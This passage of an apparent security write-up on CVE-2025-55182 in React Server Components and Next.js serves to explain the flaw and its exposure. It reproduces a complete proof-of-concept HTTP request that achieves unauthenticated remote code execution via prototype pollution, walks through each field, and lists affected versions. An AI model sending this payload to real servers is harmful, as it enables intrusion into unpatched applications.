Let’s examine the complete HTTP request from maple3142’s PoC:

```http
POST / HTTP/1.1  
Host: localhost  
Next-Action: x  
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

------WebKitFormBoundaryx8jO2oVc6SWP3Sad  
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('xcalc');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}  
------WebKitFormBoundaryx8jO2oVc6SWP3Sad  
Content-Disposition: form-data; name="1"

"$@0"  
------WebKitFormBoundaryx8jO2oVc6SWP3Sad  
Content-Disposition: form-data; name="2"

[]  
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--  
```

The `Next-Action: x` header triggers React’s Server Action processing. The multipart body contains three parts:

- **Field 0**: The fake chunk object with our malicious `_response` structure
- **Field 1**: A reference `$@0` that points back to field 0, creating the self-reference
- **Field 2**: An empty array, completing the required structure

When the server processes this request, it deserialises field 0, encounters the $@0 reference in field 1, establishes the self-referential then property, and subsequently triggers the Blob handler, which executes our code through the `Function` constructor.

## Vulnerable Versions and Attack Surface

CVE-2025-55182 affects React Server Components in the following versions:

- React 19.0.0, 19.1.0, 19.1.1, and 19.2.0
- Next.js versions ≥14.3.0-canary.77, all 15.x, and 16.x releases prior to patching
- Other frameworks using RSC: React Router (RSC mode), Waku, Redwood SDK, and various RSC plugins

The vulnerability is particularly dangerous because:

1. **Default configurations are vulnerable** - A standard Next.js application created with `create-next-app` is exploitable without any code changes
2. **No authentication required** - The attack works without any credentials
3. **High reliability** - Security researchers report near 100% exploitation success rates
4. **Wide deployment** - Wiz Research data shows 39% of cloud environments contain vulnerable instances

According to Shodan, over 571,000 public servers utilise React components, and 444,000 use Next.js. Whilst not all of these are vulnerable versions, the potential attack surface is enormous.
